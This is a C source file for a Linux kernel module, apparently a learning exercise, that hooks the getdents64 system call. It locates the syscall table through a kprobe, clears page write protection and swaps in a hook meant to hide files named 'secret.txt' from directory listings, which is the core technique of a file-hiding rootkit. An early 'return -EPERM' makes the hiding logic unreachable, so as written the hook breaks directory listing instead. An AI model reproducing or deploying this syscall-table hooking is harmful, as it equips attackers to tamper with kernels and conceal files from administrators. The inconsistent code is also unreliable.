#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/moduleparam.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LavaTime");
MODULE_DESCRIPTION("A syscall hooking module");

#define TARGET "secret.txt"

struct linux_dirent64 {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};

static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static void**sys_call_table;
typedef unsigned long (*kallsyms_lookup_name_t)(const char *);


static asmlinkage long hacked_getdents64(const struct pt_regs *regs)
{
	printk(KERN_INFO "Syscall_hooker: jumped to hacked syscall");
	return -EPERM;
	int fd __attribute__((unused))= (int)regs->di; // Marked as unused, only for learning
	struct linux_dirent64 *dirp = (struct linux_dirent64*)regs->si;
	int count __attribute__((unused)) = regs->dx; // Marked as unused, only for learning
	long ret = orig_getdents64(regs);
	if (ret <= 0)
	{
		return ret;
	}
	else
	{
		struct linux_dirent64* kdirent;
		struct linux_dirent64* current_dir;
		unsigned long offset = 0;

		kdirent = kmalloc(ret, GFP_KERNEL);
		if (kdirent == NULL)
		{
			return ret;
		}
		if (copy_from_user(kdirent, dirp, ret) != 0)
		{
			kfree(kdirent);
			return ret;
		}
		printk(KERN_INFO "Syscall_hooker: About to enter while");
		while (offset < ret)
		{
			current_dir = (struct linux_dirent64 *)((char*)kdirent + offset);
			printk(KERN_INFO "Syscall_hooker: Looking at entry %s", current_dir->d_name);
			if (!strcmp(current_dir->d_name, TARGET))
			{
				printk(KERN_INFO "Syscall_hooker: Hit a match!");
				memmove(current_dir, (struct linux_dirent64 *)((void*)current_dir + current_dir->d_reclen), (ret - (current_dir->d_reclen + offset)));
				ret -= current_dir->d_reclen;
			}
			else
			{
				offset += current_dir->d_reclen;
			}
		}
		if (copy_to_user(dirp, kdirent, ret) != 0)
		{
			kfree(kdirent);
			return -EFAULT;
		}
		kfree(kdirent);
		return ret;
	}
}

static int __init syscall_hooking_init(void)
{
	register_kprobe(&kp);
	kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);

	unsigned long sys_call_close = (unsigned long)kallsyms_lookup_name("sys_close");
	sys_call_table = (void **)kallsyms_lookup_name("sys_call_table");
	unsigned long int offset = (unsigned long int) sys_call_table;
	unsigned long **sct;
	while (offset < ((unsigned long)sys_call_table + 0x2000))
	{
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *)sys_call_close)
		{
			sys_call_table = (void **)sct;
			break;
		}
		offset += sizeof(void *);
	}
	printk(KERN_INFO "The first thing at the sys_call_table is: %lx", sys_call_table[0]);
	printk(KERN_INFO "Syscall_hooker: Target before hooking. Address: %lx\n", sys_call_table[__NR_getdents64]);
	orig_getdents64 = (asmlinkage long (*)(const struct pt_regs *))sys_call_table[__NR_getdents64];
	unsigned int __attribute__((unused)) level;
	pte_t *getdents64_pointer_pte;
	getdents64_pointer_pte = lookup_address((unsigned long)(&(sys_call_table[__NR_getdents64])), &level);
	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte | _PAGE_RW;
	// Deprecated: unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
	// Depreacated: asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
	sys_call_table[__NR_getdents64] = hacked_getdents64;
	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte & ~(_PAGE_RW);
	// Deprecated: unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
	// Deprecated: asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
	
	
	
	printk(KERN_INFO "Syscall_hooker: Target acquired. Address: %lx\n", sys_call_table[__NR_getdents64]);
	
	return 0;
}

static void __exit syscall_hooking_exit(void)
{
	unsigned int __attribute__((unused)) level;
	pte_t *getdents64_pointer_pte;
	getdents64_pointer_pte = lookup_address((unsigned long)(&(sys_call_table[__NR_getdents64])), &level);
	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte | _PAGE_RW;
	// Deprecated: unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
	// Depreacated: asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
	sys_call_table[__NR_getdents64] = orig_getdents64;
	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte & ~(_PAGE_RW);
	// Deprecated: unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
	// Deprecated: asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
	printk(KERN_INFO "Syscall_hooker: Mission complete!\n");
}

module_init(syscall_hooking_init);
module_exit(syscall_hooking_exit);

